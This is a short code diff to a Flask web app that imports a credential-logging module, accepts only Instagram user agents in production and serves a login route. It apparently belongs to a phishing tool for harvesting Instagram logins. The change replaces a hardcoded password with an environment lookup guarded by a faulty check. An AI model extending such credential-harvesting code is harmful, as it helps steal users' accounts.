@@ -1,5 +1,6 @@
 from flask import Flask, request, render_template, redirect, abort
 from credentials_logger import log_credentials, get_credentials
+from os import environ
 
 
 app = Flask(__name__)
@@ -9,8 +10,10 @@ if app.debug:               # If we're testing, allow connections from any usera
 else:                       # If we're in production mode, only allow connections from the Instagram web client
     INSTAGRAM_USERAGENT_SIGNATURE = "Instagram"
 
-
-PASSWORD = 'pass420'
+if environ:
+    PASSWORD = environ['password']
+else:
+    PASSWORD = 'pass420'
 
 
 @app.route('/login', methods=['POST'])
